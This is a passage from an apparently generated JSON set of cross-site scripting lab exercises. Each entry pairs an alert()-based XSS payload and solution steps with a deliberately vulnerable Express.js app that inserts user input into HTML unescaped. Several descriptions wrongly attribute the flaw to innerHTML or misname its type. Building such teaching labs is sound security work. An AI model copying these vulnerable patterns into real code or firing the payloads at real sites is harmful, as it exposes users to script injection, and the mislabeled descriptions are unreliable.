    "Lab Description": "Users can customize labels for their profile badges. These labels are rendered using innerHTML on profile visits. A malicious label can trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Edit badge label to: <img src=x onerror=alert(1)>",
      "Visit user profile",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('badgeXSS')</script>",
      "<img src=x onerror=alert('label')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-badge', (req, res) => { label = req.body.label; res.redirect('/profile'); });\napp.get('/profile', (req, res) => { res.send(`<html><body><span>${label}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via team introduction blurb",
    "Lab Description": "Team pages allow admins to add an intro blurb. This is shown on public team profiles using innerHTML. Unsanitized input leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit blurb: <img src=x onerror=alert(1)>",
      "Visit the team page",
      "Script executes from blurb area"
    ],
    "payloads": [
      "<script>alert('teamIntroXSS')</script>",
      "<img src=x onerror=alert('intro')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet blurb = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-blurb', (req, res) => { blurb = req.body.text; res.redirect('/team'); });\napp.get('/team', (req, res) => { res.send(`<html><body><p>${blurb}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via meeting agenda topic title",
    "Lab Description": "Meeting organizers can define custom agenda topics. These are shown on shared pages using innerHTML. A malicious title results in XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create agenda with: <script>alert('agenda')</script>",
      "Open agenda viewer",
      "Script executes in topic list"
    ],
    "payloads": [
      "<script>alert('agendaXSS')</script>",
      "<img src=x onerror=alert('topic')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet topics = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-topic', (req, res) => { topics.push(req.body.title); res.redirect('/agenda'); });\napp.get('/agenda', (req, res) => { const html = topics.map(t => `<li>${t}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via job applicant cover letter filename",
    "Lab Description": "HR portal displays uploaded cover letter filenames. These are inserted into HTML using innerHTML. If filenames are not sanitized, reflected XSS is possible.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload file named: <script>alert(1)</script>",
      "Visit applicant's file list",
      "Script executes in filename display"
    ],
    "payloads": [
      "<script>alert('filenameXSS')</script>",
      "<img src=x onerror=alert('file')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet files = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/upload', (req, res) => { files.push(req.body.name); res.redirect('/files'); });\napp.get('/files', (req, res) => { const html = files.map(f => `<div>${f}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via food delivery special instruction field",
    "Lab Description": "The app allows customers to provide delivery instructions. These are shown to the courier using innerHTML. A malicious instruction leads to XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit instruction: <script>alert('XSS')</script>",
      "Courier opens delivery details",
      "Payload executes in instructions panel"
    ],
    "payloads": [
      "<script>alert('deliveryXSS')</script>",
      "<img src=x onerror=alert('note')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/order', (req, res) => { note = req.body.note; res.redirect('/details'); });\napp.get('/details', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via transaction note in personal finance tracker",
    "Lab Description": "Users can tag transactions with notes. These are rendered in reports using innerHTML. A crafted note results in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add transaction note: <script>alert('XSS')</script>",
      "Open transaction report",
      "Script executes from note column"
    ],
    "payloads": [
      "<script>alert('financeXSS')</script>",
      "<img src=x onerror=alert('txn')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => { note = req.body.note; res.redirect('/report'); });\napp.get('/report', (req, res) => { res.send(`<html><body><td>${note}</td></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via user-submitted bug reproduction steps",
    "Lab Description": "Bug reporters can enter reproduction steps. These are shown to developers in HTML view. A malicious step can trigger XSS if innerHTML is used.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit step: <script>alert(1)</script>",
      "Open bug detail view",
      "Observe script execution in description"
    ],
    "payloads": [
      "<script>alert('bugStepsXSS')</script>",
      "<img src=x onerror=alert('repro')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet steps = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/report-bug', (req, res) => { steps = req.body.steps; res.redirect('/bug'); });\napp.get('/bug', (req, res) => { res.send(`<html><body><div>${steps}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via recipe comment in cooking platform",
    "Lab Description": "Users can leave comments under recipes. These are rendered using innerHTML. A malicious comment results in stored XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit comment: <img src=x onerror=alert(1)>",
      "Reload recipe page",
      "Script executes in comment section"
    ],
    "payloads": [
      "<script>alert('recipeXSS')</script>",
      "<img src=x onerror=alert('cook')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet comments = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/comment', (req, res) => { comments.push(req.body.text); res.redirect('/recipe'); });\napp.get('/recipe', (req, res) => { const html = comments.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via payment failure reason on checkout",
    "Lab Description": "If a payment fails, the gateway may include a failure reason in the redirect. This is reflected using innerHTML, allowing for reflected XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger redirect with reason=<img src=x onerror=alert(1)>",
      "Observe reflected input in failure message",
      "Payload executes immediately"
    ],
    "payloads": [
      "<script>alert('failXSS')</script>",
      "<img src=x onerror=alert('fail')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/fail', (req, res) => {\n  const reason = req.query.reason || 'Unknown error';\n  res.send(`<html><body><h3>${reason}</h3></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via resume headline field in job portal",
    "Lab Description": "Job seekers can add a headline to their resume. This field is displayed on search results using innerHTML. A malicious headline leads to stored XSS when viewed by recruiters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set resume headline: <img src=x onerror=alert(1)>",
      "Recruiter searches and views your profile",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('resumeXSS')</script>",
      "<img src=x onerror=alert('headline')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet headline = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/update-headline', (req, res) => { headline = req.body.headline; res.redirect('/search'); });\napp.get('/search', (req, res) => { res.send(`<html><body><h3>${headline}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via calendar event location field",
    "Lab Description": "Users can add a location to calendar events. The location is rendered using innerHTML in the event details panel. A crafted location can trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set event location to: <script>alert('XSS')</script>",
      "Open the event detail modal",
      "Script executes from location field"
    ],
    "payloads": [
      "<script>alert('calendarXSS')</script>",
      "<img src=x onerror=alert('loc')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet location = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-event', (req, res) => { location = req.body.location; res.redirect('/calendar'); });\napp.get('/calendar', (req, res) => { res.send(`<html><body><p>${location}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via social media post caption",
    "Lab Description": "Users can create posts with captions. These are rendered using innerHTML on public feeds. A malicious caption leads to persistent XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Post a caption: <img src=x onerror=alert(1)>",
      "View public feed",
      "Script executes from caption section"
    ],
    "payloads": [
      "<script>alert('feedXSS')</script>",
      "<img src=x onerror=alert('caption')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet caption = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-post', (req, res) => { caption = req.body.caption; res.redirect('/feed'); });\napp.get('/feed', (req, res) => { res.send(`<html><body><p>${caption}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via IoT device label in smart home dashboard",
    "Lab Description": "Users can assign custom names to their IoT devices. These names are rendered using innerHTML in the dashboard. A crafted name can cause XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Name device: <img src=x onerror=alert(1)>",
      "Load smart dashboard",
      "Observe payload execution from device label"
    ],
    "payloads": [
      "<script>alert('iotXSS')</script>",
      "<img src=x onerror=alert('smart')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/name-device', (req, res) => { label = req.body.name; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><h2>${label}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via user report description in moderation panel",
    "Lab Description": "Users can report posts with a reason. These reasons are shown to moderators using innerHTML. A malicious reason can cause stored XSS in the mod view.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit report with reason: <script>alert('XSS')</script>",
      "Moderator opens reports dashboard",
      "Script executes in reason column"
    ],
    "payloads": [
      "<script>alert('reportXSS')</script>",
      "<img src=x onerror=alert('mod')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet reports = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/report', (req, res) => { reports.push(req.body.reason); res.redirect('/'); });\napp.get('/mod', (req, res) => { const html = reports.map(r => `<li>${r}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via video playlist title in streaming platform",
    "Lab Description": "Users can create custom playlists on a video platform. Playlist titles are rendered using innerHTML. A malicious title can lead to stored XSS on the playlist viewer page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a playlist with title: <script>alert('XSS')</script>",
      "Visit the playlist page",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('playlistXSS')</script>",
      "<img src=x onerror=alert('video')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet playlist = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-playlist', (req, res) => { playlist = req.body.title; res.redirect('/view-playlist'); });\napp.get('/view-playlist', (req, res) => { res.send(`<html><body><h2>${playlist}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via friend group name in messaging app",
    "Lab Description": "The app allows grouping contacts under custom labels. Group names are rendered using innerHTML in the sidebar. A crafted group name causes XSS when the group is viewed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create group with name: <img src=x onerror=alert(1)>",
      "Open messaging sidebar",
      "Script executes in group name"
    ],
    "payloads": [
      "<script>alert('groupXSS')</script>",
      "<img src=x onerror=alert('group')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet group = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-group', (req, res) => { group = req.body.name; res.redirect('/messenger'); });\napp.get('/messenger', (req, res) => { res.send(`<html><body><div>${group}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via QR code label in scanner dashboard",
    "Lab Description": "Admins can assign labels to QR codes. These labels are rendered using innerHTML in dashboards. A malicious label can trigger XSS in QR viewer.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Label a QR code: <script>alert(1)</script>",
      "Open the QR dashboard",
      "Observe payload execution in label section"
    ],
    "payloads": [
      "<script>alert('qrXSS')</script>",
      "<img src=x onerror=alert('qr')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/label-qr', (req, res) => { label = req.body.label; res.redirect('/qr-view'); });\napp.get('/qr-view', (req, res) => { res.send(`<html><body><p>${label}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via image gallery tag name",
    "Lab Description": "Users can tag images with custom text. Tag names are rendered using innerHTML below each image. A malicious tag can cause XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add tag: <img src=x onerror=alert(1)>",
      "Open tagged image gallery",
      "Script executes in tag element"
    ],
    "payloads": [
      "<script>alert('tagXSS')</script>",
      "<img src=x onerror=alert('tag')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tag = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-tag', (req, res) => { tag = req.body.tag; res.redirect('/gallery'); });\napp.get('/gallery', (req, res) => { res.send(`<html><body><div>${tag}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via donation message in charity platform",
    "Lab Description": "Supporters can leave a message with their donations. Messages are rendered using innerHTML in public feed. Malicious input leads to stored XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit donation with message: <img src=x onerror=alert(1)>",
      "Visit donation feed",
      "Script executes in message section"
    ],
    "payloads": [
      "<script>alert('donationXSS')</script>",
      "<img src=x onerror=alert('charity')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet msg = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/donate', (req, res) => { msg = req.body.message; res.redirect('/feed'); });\napp.get('/feed', (req, res) => { res.send(`<html><body><blockquote>${msg}</blockquote></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via real-time game lobby name",
    "Lab Description": "Multiplayer games allow custom lobby names. These are broadcasted live to all players using innerHTML. A crafted name leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create lobby: <script>alert(1)</script>",
      "Join lobby browser",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('lobbyXSS')</script>",
      "<img src=x onerror=alert('lobby')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet lobby = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-lobby', (req, res) => { lobby = req.body.name; res.redirect('/lobbies'); });\napp.get('/lobbies', (req, res) => { res.send(`<html><body><h3>${lobby}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via auction bid comment field",
    "Lab Description": "Bidders can leave a comment with their bids. These comments are shown using innerHTML. A malicious comment triggers stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit bid comment: <script>alert(1)</script>",
      "Seller opens bid history",
      "Script executes in comment section"
    ],
    "payloads": [
      "<script>alert('bidXSS')</script>",
      "<img src=x onerror=alert('bid')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet comment = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/place-bid', (req, res) => { comment = req.body.comment; res.redirect('/bids'); });\napp.get('/bids', (req, res) => { res.send(`<html><body><p>${comment}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via shipping provider name in tracking system",
    "Lab Description": "Admins can add shipping provider names manually. These are rendered via innerHTML in the tracking status page. A malicious name leads to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add provider: <img src=x onerror=alert(1)>",
      "Open tracking info",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('shippingXSS')</script>",
      "<img src=x onerror=alert('track')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet provider = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-provider', (req, res) => { provider = req.body.name; res.redirect('/tracking'); });\napp.get('/tracking', (req, res) => { res.send(`<html><body><span>${provider}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via leaderboard player nickname",
    "Lab Description": "Players can set nicknames in leaderboards. If rendered via innerHTML, a crafted name leads to persistent XSS for viewers.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set nickname: <script>alert('XSS')</script>",
      "Visit leaderboard",
      "Script executes from nickname row"
    ],
    "payloads": [
      "<script>alert('nicknameXSS')</script>",
      "<img src=x onerror=alert('player')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet nickname = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-nickname', (req, res) => { nickname = req.body.name; res.redirect('/leaderboard'); });\napp.get('/leaderboard', (req, res) => { res.send(`<html><body><td>${nickname}</td></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via code review comment in dev collaboration tool",
    "Lab Description": "Reviewers can comment on code snippets. Comments are rendered with innerHTML next to code. A crafted comment triggers XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit comment: <img src=x onerror=alert(1)>",
      "Open review page",
      "Script executes in comment block"
    ],
    "payloads": [
      "<script>alert('reviewXSS')</script>",
      "<img src=x onerror=alert('dev')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet comment = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-comment', (req, res) => { comment = req.body.comment; res.redirect('/code'); });\napp.get('/code', (req, res) => { res.send(`<html><body><div>${comment}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via onboarding welcome message customization",
    "Lab Description": "Admins can customize the welcome message shown to new users during onboarding. If this message is rendered using innerHTML, a malicious input can result in stored XSS for every new user.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set welcome message to: <script>alert('XSS')</script>",
      "Register a new user and complete onboarding",
      "Script executes when message is displayed"
    ],
    "payloads": [
      "<script>alert('welcomeXSS')</script>",
      "<img src=x onerror=alert('onboard')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet message = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-welcome', (req, res) => { message = req.body.message; res.redirect('/'); });\napp.get('/onboarding', (req, res) => { res.send(`<html><body><h1>${message}</h1></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via refund reason field in e-commerce admin",
    "Lab Description": "When a refund is issued, admins can specify a reason which is displayed to the user. If the input is rendered without sanitization, reflected XSS is possible.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Issue refund with reason: <img src=x onerror=alert('XSS')>",
      "Customer opens refund history page",
      "Payload executes in refund reason display"
    ],
    "payloads": [
      "<script>alert('refundXSS')</script>",
      "<img src=x onerror=alert('refund')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet reason = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/refund', (req, res) => { reason = req.body.reason; res.redirect('/history'); });\napp.get('/history', (req, res) => { res.send(`<html><body><p>${reason}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via fitness challenge team name",
    "Lab Description": "Users can create fitness challenges and assign their own team names. These are rendered on challenge pages via innerHTML. A crafted name results in XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create team with name: <script>alert('XSS')</script>",
      "Visit challenge leaderboard",
      "Observe script execution from name field"
    ],
    "payloads": [
      "<script>alert('challengeXSS')</script>",
      "<img src=x onerror=alert('team')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet team = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/join-challenge', (req, res) => { team = req.body.name; res.redirect('/challenge'); });\napp.get('/challenge', (req, res) => { res.send(`<html><body><h3>${team}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via CMS plugin configuration field",
    "Lab Description": "A CMS plugin allows user-defined descriptions to appear in its output. These fields are rendered with innerHTML. A malicious input can lead to stored XSS on the frontend.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Configure plugin with description: <script>alert('XSS')</script>",
      "View frontend widget using the plugin",
      "Script executes in plugin output"
    ],
    "payloads": [
      "<script>alert('pluginXSS')</script>",
      "<img src=x onerror=alert('cms')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/plugin-config', (req, res) => { desc = req.body.desc; res.redirect('/widget'); });\napp.get('/widget', (req, res) => { res.send(`<html><body><div>${desc}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via guestbook entry on public page",
    "Lab Description": "A public-facing guestbook allows anonymous users to leave messages. Entries are rendered using innerHTML without proper escaping, leading to stored XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit entry: <script>alert(1)</script>",
      "View guestbook page",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('guestbookXSS')</script>",
      "<img src=x onerror=alert('guest')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet entries = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/sign', (req, res) => { entries.push(req.body.msg); res.redirect('/guestbook'); });\napp.get('/guestbook', (req, res) => { const html = entries.map(e => `<li>${e}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via banking memo field in transaction list",
    "Lab Description": "Bank customers can attach memos to transfers. These are displayed in the transaction history using innerHTML. XSS is possible if input is not sanitized.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Transfer funds with memo: <script>alert('XSS')</script>",
      "View transaction history",
      "Script executes in memo field"
    ],
    "payloads": [
      "<script>alert('memoXSS')</script>",
      "<img src=x onerror=alert('bank')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet memo = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/transfer', (req, res) => { memo = req.body.memo; res.redirect('/history'); });\napp.get('/history', (req, res) => { res.send(`<html><body><td>${memo}</td></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via email alias name in mailbox overview",
    "Lab Description": "Users can create email aliases with custom names. These are rendered in the UI using innerHTML. XSS occurs if input is not escaped.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create alias name: <script>alert('XSS')</script>",
      "View mailbox overview",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('aliasXSS')</script>",
      "<img src=x onerror=alert('alias')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet alias = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-alias', (req, res) => { alias = req.body.name; res.redirect('/mailbox'); });\napp.get('/mailbox', (req, res) => { res.send(`<html><body><div>${alias}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via survey title in analytics dashboard",
    "Lab Description": "Survey creators can name their surveys. These titles appear in dashboards using innerHTML. A malicious title leads to stored XSS for admins.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create survey titled: <script>alert(1)</script>",
      "Open admin dashboard",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('surveyXSS')</script>",
      "<img src=x onerror=alert('survey')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-survey', (req, res) => { title = req.body.title; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><h2>${title}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via API gateway route description",
    "Lab Description": "Developers can add descriptions to API routes. These are rendered in the API gateway UI using innerHTML. If not sanitized, they are vulnerable to XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Add route description: <script>alert('XSS')</script>",
      "Visit gateway interface",
      "Observe script execution from route listing"
    ],
    "payloads": [
      "<script>alert('routeXSS')</script>",
      "<img src=x onerror=alert('api')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-route', (req, res) => { desc = req.body.desc; res.redirect('/gateway'); });\napp.get('/gateway', (req, res) => { res.send(`<html><body><span>${desc}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via education platform lesson subtitle",
    "Lab Description": "Lesson creators can provide subtitles. These appear under videos using innerHTML. A malicious subtitle leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set subtitle to: <img src=x onerror=alert('XSS')>",
      "Open lesson viewer",
      "Script executes beneath video"
    ],
    "payloads": [
      "<script>alert('lessonXSS')</script>",
      "<img src=x onerror=alert('edu')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet subtitle = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-subtitle', (req, res) => { subtitle = req.body.subtitle; res.redirect('/lesson'); });\napp.get('/lesson', (req, res) => { res.send(`<html><body><p>${subtitle}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via job title in internal HR portal",
    "Lab Description": "Employees can submit custom job titles that appear in internal directories. These titles are rendered with innerHTML. A crafted title causes stored XSS when viewed by other employees.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set your job title to <img src=x onerror=alert('XSS')>",
      "Visit the company directory",
      "Script executes in job title display"
    ],
    "payloads": [
      "<script>alert('hrXSS')</script>",
      "<img src=x onerror=alert('job')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-title', (req, res) => { title = req.body.title; res.redirect('/directory'); });\napp.get('/directory', (req, res) => { res.send(`<html><body><span>${title}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via live polling answer text",
    "Lab Description": "Users can submit custom answers in live polls. These answers are displayed live using innerHTML. If not sanitized, this can lead to DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit poll answer: <script>alert('XSS')</script>",
      "Open live poll results",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('pollXSS')</script>",
      "<img src=x onerror=alert('vote')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet answer = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/vote', (req, res) => { answer = req.body.answer; res.redirect('/results'); });\napp.get('/results', (req, res) => { res.send(`<html><body><div>${answer}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via feedback category label in support portal",
    "Lab Description": "Users can suggest custom feedback categories. These are displayed to all users using innerHTML. A malicious label causes persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit category: <img src=x onerror=alert(1)>",
      "Visit feedback page",
      "Observe XSS in category list"
    ],
    "payloads": [
      "<script>alert('feedbackXSS')</script>",
      "<img src=x onerror=alert('support')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet category = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-category', (req, res) => { category = req.body.name; res.redirect('/feedback'); });\napp.get('/feedback', (req, res) => { res.send(`<html><body><li>${category}</li></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via weather widget city name",
    "Lab Description": "Users can add custom cities to their weather widgets. If the city name is injected unsanitized into innerHTML, XSS can occur in the dashboard.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Add city: <img src=x onerror=alert('XSS')>",
      "Open dashboard widget",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('weatherXSS')</script>",
      "<img src=x onerror=alert('weather')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet city = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-city', (req, res) => { city = req.body.name; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><div>${city}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via mobile app push notification title",
